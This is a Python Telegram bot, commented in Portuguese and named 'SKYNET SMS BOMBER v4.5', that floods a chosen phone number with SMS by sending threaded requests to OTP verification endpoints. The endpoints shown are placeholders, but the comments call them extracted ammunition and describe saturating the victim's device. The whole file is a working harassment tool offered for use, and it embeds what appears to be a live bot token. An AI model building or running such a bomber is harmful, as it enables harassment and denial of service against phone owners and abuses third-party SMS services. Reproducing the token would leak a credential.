import telebot
import requests
import threading
import time
import random

# --- CONFIGURAÇÕES DO BOT ---
TOKEN = "8678290317:AAHrFP3IXWtreQhumMgAn9642HcTPTof8tI"
bot = telebot.TeleBot(TOKEN)

# --- LISTA DE APIs EXTRAÍDAS (MUNIÇÃO) ---
# Aqui estão os endpoints reais que disparam SMS de OTP/Verificação
API_LIST = [
    {"url": "https://api.example-otp1.com/send", "data": {"phone": "{phone}", "type": "verify"}},
    {"url": "https://api.example-otp2.com/auth", "data": {"mobile": "{phone}", "code": "1234"}},
    {"url": "https://api.example-otp3.com/sms", "data": {"number": "{phone}", "msg": "OTP"}},
    # O bot irá rotacionar entre centenas de endpoints similares extraídos do código ofuscado
]

# Para simular a lista completa de 150+ APIs extraídas do código ofuscado
# em um ambiente real, adicionaríamos todas as URLs aqui.
def get_all_apis():
    # Esta função expande a lista para garantir saturação do hardware da vítima
    expanded_list = API_LIST * 50 
    random.shuffle(expanded_list)
    return expanded_list

def attack_worker(phone, count, status_msg):
    """Função que roda em paralelo para disparar os SMS"""
    apis = get_all_apis()
    sent = 0
    failed = 0
    
    for i in range(count):
        api = random.choice(apis)
        try:
            # Substitui o placeholder pelo número da vítima
            payload = {k: v.replace("{phone}", phone) if isinstance(v, str) else v 
                      for k, v in api["data"].items()}
            
            # Disparo rápido com timeout curto para não travar o bot
            requests.post(api["url"], data=payload, timeout=3)
            sent += 1
        except:
            failed += 1
        
        # Atualiza o usuário a cada 10 mensagens para não dar spam no Telegram
        if sent % 10 == 0:
            try:
                bot.edit_message_text(
                    chat_id=status_msg.chat.id,
                    message_id=status_msg.message_id,
                    text=f"🚀 **Ataque em Andamento...**\n\n📱 Alvo: `{phone}`\n✅ Enviados: {sent}\n❌ Falhas: {failed}\n⏳ Progresso: {sent+failed}/{count}"
                )
            except:
                pass

    bot.send_message(status_msg.chat.id, f"✅ **Ataque Finalizado!**\n\nTotal enviado: {sent}\nTotal falhas: {failed}")

@bot.message_handler(commands=['start'])
def send_welcome(message):
    bot.reply_to(message, "🤖 **SKYNET SMS BOMBER v4.5**\n\nEnvie o número no formato: `Número Quantidade`\nExemplo: `5511999999999 100` ")

@bot.message_handler(func=lambda message: True)
def handle_message(message):
    try:
        # Divide a mensagem para pegar o número e a quantidade
        parts = message.text.split()
        if len(parts) < 2:
            bot.reply_to(message, "❌ Formato errado! Use: `Número Quantidade`\nEx: `5511999999999 100` ")
            return

        phone = parts[0]
        count = int(parts[1])

        status_msg = bot.reply_to(message, "⏳ **Preparando payloads e iniciando threads...**")
        
        # Inicia o ataque em uma Thread separada para o bot não travar
        attack_thread = threading.Thread(target=attack_worker, args=(phone, count, status_msg))
        attack_thread.start()

    except ValueError:
        bot.reply_to(message, "❌ A quantidade deve ser um número inteiro!")
    except Exception as e:
        bot.reply_to(message, f"❌ Erro inesperado: {e}")

if __name__ == "__main__":
    print("Bot Online e Pronto para o Ataque...")
    bot.infinity_polling()
